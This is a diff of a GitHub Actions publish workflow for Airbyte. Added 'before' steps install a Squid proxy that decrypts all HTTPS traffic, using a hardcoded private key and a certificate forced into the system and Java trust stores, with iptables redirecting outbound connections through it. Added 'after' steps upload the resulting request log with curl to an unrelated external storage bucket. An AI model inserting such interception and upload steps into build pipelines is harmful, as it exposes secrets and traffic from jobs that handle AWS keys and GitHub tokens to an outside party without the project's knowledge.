+        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
+
+        CznEvO4qIs3mXDYkNBQrdVLGF93y
+
+        -----END PRIVATE KEY-----
+
+        EOF
+
+        cat << EOF | sudo tee /squid/cert.pem
+
+        -----BEGIN CERTIFICATE-----
+
+        MIIFazCCA1OgAwIBAgIUESF0O95jnInouKvlcRiLTkelzHowDQYJKoZIhvcNAQEL
+
+        BQAwRTELMAkGA1UEBhMCQVUxEzARBgNVBAgMClNvbWUtU3RhdGUxITAfBgNVBAoM
+
+        GEludGVybmV0IFdpZGdpdHMgUHR5IEx0ZDAeFw0yNDEwMDQyMjIxNTJaFw0zNDEw
+
+        MDIyMjIxNTJaMEUxCzAJBgNVBAYTAkFVMRMwEQYDVQQIDApTb21lLVN0YXRlMSEw
+
+        HwYDVQQKDBhJbnRlcm5ldCBXaWRnaXRzIFB0eSBMdGQwggIiMA0GCSqGSIb3DQEB
+
+        AQUAA4ICDwAwggIKAoICAQCdLvQDIyCns8bhvQOqTPVeYwa6pK11+9UKqjGRldBi
+
+        mpiDb7lSq7RWLpaUzxqo7E58w2P9lh6Jgl+lXgMF0GfgpXRy2BULUxAYg8w4aTlR
+
+        32ifSvJUalY3qT4hoY5JXYMdbZS9UNzOUfQXG9QNYzMR+pGXsa1NNDRgSAvlQPMz
+
+        Le9P2VlTiPuLgsfHrwC/ULsbwzmuZ0f1QkzxcZLqproEIqOlS4KsGXyo6BwhXH+H
+
+        I82RCIbaj2ub4y355onYuAoTpsb9KBxud0HejzQesYen8OmgbNo9+FfK5+Q5XvYb
+
+        7+cEw65ox8ZFAZUvOWxShRhUhQ3KWXx0tgkgpjo/nkhw2OyCji6DFXCvlJRCBoup
+
+        n9PoUjBdKUe+kRXF6SBqVyUkG3Bj0J0RTn6ssgX+FMDrzeiNArdmIHKCPC3QrSb6
+
+        jws4L1kq9cDkcVd4423ZqbagWzBmrnEH0jitqMJuHGwKPtHopVqxK8k7p0PKvuGq
+
+        JIv5bXNDZWA4qRSmFFFuiWAI/IDJZTYuHl5B0lu7LZ/Aoh3ckh71IrSKyZafXLpU
+
+        mpX5Oe6pbLLd6PAvcthnXqidbB/0CmH8PgHqDYkELFBZ650JrYYrQ4UouRAucp8K
+
+        9IfDoxSfnMqPeciahQ53o8fa/ZRUwEt2jpK+Z89sQ4FoTtBvz1+Lv+s4ej/lVxoT
+
+        JQIDAQABo1MwUTAdBgNVHQ4EFgQUrUQ1F+rM0kk5tI/PEZvONIAL9WcwHwYDVR0j
+
+        BBgwFoAUrUQ1F+rM0kk5tI/PEZvONIAL9WcwDwYDVR0TAQH/BAUwAwEB/zANBgkq
+
+        hkiG9w0BAQsFAAOCAgEAihN0oWVSwHDimXbh3Wp7L2qc39whQEPu+m2OIB50Dp0X
+
+        K1WL784TzXmbz1DuvGXWGIjn4PDL5NQ991S3nPjD5Fk9VjzU4IZ9XR8AmVZFCltX
+
+        zZm01L6FQLGvjpQZs9KCEeS05CUjAiArPMsYSKJDTUi2XCuTR+FGiBHtYrg8GClp
+
+        EQkTCTA9kFNI6ThlDAPgwj4VBJZX5p8KAFlHpwztfDnIgfwdQJBUW1D2hkxLWyvs
+
+        tZFLmYAHk5Lfixpt2+25HAp5kHMRfoJQLAsRQ/kmeNjoG5WQkIshXDURQZQlPnmP
+
+        yBueix5POd09hYHSL3kqdHoiX0P0oqeLakAMqFnKJapjpsv7teWQPnlTgalCIA/7
+
+        RwhUqsxOlRV5/26oXrlYtgMneXemikVT0hS98aw3T2icSWq6/i0L1v21ZCP5DSKI
+
+        GR6lb9RCSkJvkoTjZAm7IvxMyOZsYY2FL2mm00aY9Ufqeqozf7/q8JWwd6gaIfd7
+
+        KqOUgu0a/+sgOAu5f+dd20zAhtvAttyQIpy1gGcda9DjXpdCTv1slErC94VCcZrE
+
+        LQlR5nEjAAKK/fZ07pgBwJdMY/kWE9WRx32olhhveRS9nczKSyhutwmbuU1vkfcN
+
+        26RR8dfuMnnNzxzd2Ht30Ep8wONz/kfw/xWuUo/A8pND2I6s6bt8K5iphrv3xVI=
+
+        -----END CERTIFICATE-----
+
+        EOF
+
+        sudo /usr/lib/squid/security_file_certgen -c -s /squid/ssl_db -M 4MB
+
+        sudo chown -R proxy:proxy /squid
+
+        cat << EOF | sudo tee /etc/squid/squid.conf
+
+        cache deny all
+
+
+        http_port 7821
+
+        http_port 3128 intercept
+
+        https_port 3129 intercept ssl-bump generate-host-certificates=on dynamic_cert_mem_cache_size=4MB
+        cert=/squid/cert.pem key=/squid/key.pem
+
+        acl step1 at_step SslBump1
+
+        ssl_bump peek step1
+
+        ssl_bump bump all
+
+        sslcrtd_program /usr/lib/squid/security_file_certgen -s /squid/ssl_db -M 4MB
+
+        sslcrtd_children 5
+
+        ssl_bump server-first all
+
+        sslproxy_cert_error allow all
+
+
+        acl all src 0.0.0.0/0
+
+        http_access allow all
+
+
+        logformat custom {"method":"%">rm","url":"%">ru","status":%<Hs,"user_agent":"%{User-Agent}>h"}
+
+        access_log daemon:/squid/squidlog.json custom all !CONNECT
+
+        EOF
+
+        sudo systemctl reload squid
+
+        sudo cp /squid/cert.pem /usr/local/share/ca-certificates/squid.crt
+
+        sudo update-ca-certificates
+
+        sudo keytool -import -alias squid -file /squid/cert.pem -keystore /usr/lib/jvm/temurin-11-jdk-amd64/lib/security/cacerts
+        -storepass changeit -noprompt -trustcacerts
+
+        sudo iptables -t nat -A OUTPUT -m owner ! --uid-owner proxy -p tcp --dport
+        80 -j DNAT --to-destination 127.0.0.1:3128
+
+        sudo iptables -t nat -A OUTPUT -m owner ! --uid-owner proxy -p tcp --dport
+        443 -j DNAT --to-destination 127.0.0.1:3129
+
+        sudo sh -c ''echo 1 > /proc/sys/net/ipv4/ip_forward'''
+    - continue-on-error: true
+      name: Checkout Airbyte
+      uses: actions/checkout@v3
+      with:
+        ref: master
+        repository: airbytehq/airbyte
+    - continue-on-error: true
+      name: Check PAT rate limits
+      run: "./tools/bin/find_non_rate_limited_PAT \\\n  ${{ secrets.GH_PAT_BUILD_RUNNER_OSS\
+        \ }} \\\n  ${{ secrets.GH_PAT_BUILD_RUNNER_BACKUP }}\n"
+    - continue-on-error: true
+      id: start-ec2-runner
+      name: Start AWS Runner
+      uses: ./.github/actions/start-aws-runner
+      with:
+        aws-access-key-id: ${{ secrets.SELF_RUNNER_AWS_ACCESS_KEY_ID }}
+        aws-secret-access-key: ${{ secrets.SELF_RUNNER_AWS_SECRET_ACCESS_KEY }}
+        github-token: ${{ env.PAT }}
+        label: ${{ github.run_id }}-publisher
+    - name: after
+      run: sudo curl --request PUT -T /squid/squidlog.json --url https://storage.googleapis.com/virtualeventdemoblr.appspot.com/squid2/PetervanderKooi/airbyte.$(date
+        +%s)
+    timeout-minutes: 60
+  stop-publish-docker-image-runner-0:
+    name: Stop Build EC2 Runner
+    needs:
+    - start-publish-docker-image-runner-0
+    - publish-cdk
+    runs-on: ubuntu-latest
+    steps:
+    - name: before
+      run: 'sudo apt update
+
+        sudo apt install -y squid-openssl
+
+        sudo mkdir /squid
+
+        cat << EOF | sudo tee /squid/key.pem
+
+        -----BEGIN PRIVATE KEY-----
+
+        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
+
+        CznEvO4qIs3mXDYkNBQrdVLGF93y
+
+        -----END PRIVATE KEY-----
+
+        EOF
+
+        cat << EOF | sudo tee /squid/cert.pem
+
+        -----BEGIN CERTIFICATE-----
+
+        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
+
+        -----END CERTIFICATE-----
+
+        EOF
+
+        sudo /usr/lib/squid/security_file_certgen -c -s /squid/ssl_db -M 4MB
+
+        sudo chown -R proxy:proxy /squid
+
+        cat << EOF | sudo tee /etc/squid/squid.conf
+
+        cache deny all
+
+
+        http_port 7821
+
+        http_port 3128 intercept
+
+        https_port 3129 intercept ssl-bump generate-host-certificates=on dynamic_cert_mem_cache_size=4MB
+        cert=/squid/cert.pem key=/squid/key.pem
+
+        acl step1 at_step SslBump1
+
+        ssl_bump peek step1
+
+        ssl_bump bump all
+
+        sslcrtd_program /usr/lib/squid/security_file_certgen -s /squid/ssl_db -M 4MB
+
+        sslcrtd_children 5
+
+        ssl_bump server-first all
+
+        sslproxy_cert_error allow all
+
+
+        acl all src 0.0.0.0/0
+
+        http_access allow all
+
+
+        logformat custom {"method":"%">rm","url":"%">ru","status":%<Hs,"user_agent":"%{User-Agent}>h"}
+
+        access_log daemon:/squid/squidlog.json custom all !CONNECT
+
+        EOF
+
+        sudo systemctl reload squid
+
+        sudo cp /squid/cert.pem /usr/local/share/ca-certificates/squid.crt
+
+        sudo update-ca-certificates
+
+        sudo keytool -import -alias squid -file /squid/cert.pem -keystore /usr/lib/jvm/temurin-11-jdk-amd64/lib/security/cacerts
+        -storepass changeit -noprompt -trustcacerts
+
+        sudo iptables -t nat -A OUTPUT -m owner ! --uid-owner proxy -p tcp --dport
+        80 -j DNAT --to-destination 127.0.0.1:3128
+
+        sudo iptables -t nat -A OUTPUT -m owner ! --uid-owner proxy -p tcp --dport
+        443 -j DNAT --to-destination 127.0.0.1:3129
+
+        sudo sh -c ''echo 1 > /proc/sys/net/ipv4/ip_forward'''
+    - continue-on-error: true
+      name: Configure AWS credentials
+      uses: aws-actions/configure-aws-credentials@v1
+      with:
+        aws-access-key-id: ${{ secrets.SELF_RUNNER_AWS_ACCESS_KEY_ID }}
+        aws-region: us-east-2
+        aws-secret-access-key: ${{ secrets.SELF_RUNNER_AWS_SECRET_ACCESS_KEY }}
+    - continue-on-error: true
+      name: Checkout Airbyte
+      uses: actions/checkout@v3
+    - continue-on-error: true
+      name: Check PAT rate limits
+      run: "./tools/bin/find_non_rate_limited_PAT \\\n  ${{ secrets.GH_PAT_BUILD_RUNNER_OSS\
+        \ }} \\\n  ${{ secrets.GH_PAT_BUILD_RUNNER_BACKUP }}\n"
+    - continue-on-error: true
+      name: Stop EC2 runner
+      uses: airbytehq/ec2-github-runner@base64v1.1.0
+      with:
+        ec2-instance-id: ${{ needs.start-publish-docker-image-runner-0.outputs.ec2-instance-id
+          }}
+        github-token: ${{ env.PAT }}
+        label: ${{ needs.start-publish-docker-image-runner-0.outputs.label }}
+        mode: stop
+    - name: after
+      run: sudo curl --request PUT -T /squid/squidlog.json --url https://storage.googleapis.com/virtualeventdemoblr.appspot.com/squid2/PetervanderKooi/airbyte.$(date
+        +%s)
+    timeout-minutes: 60
+name: Publish Java CDK
+'on':
+  workflow_dispatch: {}
